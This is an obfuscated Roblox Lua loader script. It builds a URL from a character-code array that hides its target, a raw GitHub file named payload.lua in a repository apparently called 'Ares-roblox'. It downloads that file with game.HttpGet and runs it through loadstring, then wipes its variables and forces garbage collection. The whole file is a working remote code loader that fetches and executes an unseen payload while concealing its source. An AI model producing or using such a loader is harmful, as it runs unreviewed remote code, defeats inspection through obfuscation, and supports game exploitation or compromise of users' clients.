local a=string.char
local b=table.concat
local c=game.HttpGet
local d=loadstring

local e={
104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,
117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,71,111,
107,117,53,53,48,53,48,47,65,114,101,115,45,114,111,98,108,111,120,
47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,112,
97,121,108,111,97,100,46,108,117,97
}

local f={}
for i=1,#e do
    f[i]=a(e[i])
end

local g=b(f)
local h=d(c(game,g))
if h then h() end

f=nil e=nil g=nil
collectgarbage("collect")
